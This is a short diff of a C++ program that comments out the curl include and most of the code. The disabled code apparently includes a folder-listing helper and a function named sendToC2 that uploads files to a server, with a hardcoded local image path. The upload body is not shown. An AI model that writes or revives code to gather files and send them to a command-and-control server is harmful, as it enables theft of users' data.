@@ -3,7 +3,7 @@
 #include <string>
 #include <fstream>
 #include <iostream>
-#include <curl/curl.h>
+//#include "libcurl/curl.h"
 #include <vector>
 #include <filesystem>
 
@@ -16,6 +16,7 @@ vector<string> getFileNamesFromPath(string location) {
 		paths.push_back(entry.path().string());
 	return paths;
 }
+/*
 
 //https://stackoverflow.com/questions/38320819/c-curl-send-mulipart-form-data-file-to-webserver
 void sendToC2(string path) {
@@ -64,4 +65,6 @@ int main(int argc, char* argv[]) {
 	}
 	string path = "C:\\Users\\53444\\source\\repos\\post\\doge.png";
 }
+
+*/
 
